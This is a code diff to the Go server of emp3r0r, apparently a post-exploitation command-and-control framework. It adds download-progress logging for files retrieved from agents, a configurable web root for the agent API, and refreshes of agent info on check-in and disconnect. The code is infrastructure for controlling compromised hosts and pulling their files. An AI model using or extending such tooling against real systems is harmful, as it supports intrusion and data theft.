@@ -20,6 +20,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/posener/h2conn"
+	"github.com/schollz/progressbar/v3"
 )
 
 // StreamHandler allow the http handler to use H2Conn
@@ -122,6 +123,13 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 			return
 		}
 	}
+
+	// file
+	targetFile := FileGetDir + util.FileBaseName(filename)
+	targetSize := util.FileSize(targetFile)
+	nowSize := util.FileSize(filewrite)
+
+	// on exit
 	defer func() {
 		// cleanup
 		if sh.H2x.Conn != nil {
@@ -144,9 +152,8 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 		}
 
 		// have we finished downloading?
-		targetFile := FileGetDir + util.FileBaseName(filename)
-		nowSize := util.FileSize(filewrite)
-		targetSize := util.FileSize(targetFile)
+		nowSize = util.FileSize(filewrite)
+		targetSize = util.FileSize(targetFile)
 		if nowSize == targetSize && nowSize >= 0 {
 			err = os.Rename(filewrite, targetFile)
 			if err != nil {
@@ -170,6 +177,22 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 	}
 	defer f.Close()
 
+	// progressbar
+	targetSize = util.FileSize(targetFile)
+	nowSize = util.FileSize(filewrite)
+	bar := progressbar.DefaultBytesSilent(targetSize)
+	bar.Add64(nowSize) // downloads are resumable
+	defer bar.Close()
+
+	// log progress instead of showing the actual progressbar
+	go func() {
+		for state := bar.State(); state.CurrentPercent < 1; time.Sleep(time.Second) {
+			state = bar.State()
+			CliPrintInfo("%.2f%% downloaded at %.2fKB/s, %.2fs passed, %.2fs left",
+				state.CurrentPercent*100, state.KBsPerSecond, state.SecondsSince, state.SecondsLeft)
+		}
+	}()
+
 	// read filedata
 	for sh.H2x.Ctx.Err() == nil {
 		data := make([]byte, sh.BufSize)
@@ -188,6 +211,9 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 			CliPrintError("ftpHandler failed to save file: %v", err)
 			return
 		}
+
+		// progress
+		bar.Add(sh.BufSize)
 	}
 }
 
@@ -342,7 +368,7 @@ func TLSServer() {
 	// File server
 	r.PathPrefix("/www/").Handler(http.StripPrefix("/www/", http.FileServer(http.Dir(WWWRoot))))
 	// handlers
-	r.HandleFunc("/emp3r0r/{api}/{token}", dispatcher)
+	r.HandleFunc(fmt.Sprintf("/%s/{api}/{token}", tun.WebRoot), dispatcher)
 
 	// use router
 	http.Handle("/", r)
@@ -389,6 +415,28 @@ func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
 			"running %s\n",
 			shortname, fmt.Sprintf("%s - %s", target.IP, target.Transport),
 			strconv.Quote(target.OS))
+
+		ListTargets() // refresh agent list
+	} else {
+		// just update this agent's sysinfo
+		for a := range Targets {
+			if a.Tag == target.Tag {
+				a = &target
+				break
+			}
+		}
+		shortname := strings.Split(target.Tag, "-agent")[0]
+		// set labels
+		if util.IsFileExist(AgentsJSON) {
+			var mutex = &sync.Mutex{}
+			if l := SetAgentLabel(&target, mutex); l != "" {
+				shortname = l
+			}
+		}
+		CliPrintDebug("Refreshing sysinfo\n%s from %s, "+
+			"running %s\n",
+			shortname, fmt.Sprintf("%s - %s", target.IP, target.Transport),
+			strconv.Quote(target.OS))
 	}
 }
 
@@ -409,6 +457,8 @@ func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
 				SetDynamicPrompt()
 				CliAlert(color.FgHiRed, "[%d] Agent dies", c.Index)
 				CliMsg("[%d] agent %s disconnected\n", c.Index, strconv.Quote(t.Tag))
+				ListTargets()
+				AgentInfoPane.Printf(true, color.HiYellowString("No agent selected"))
 				break
 			}
 		}
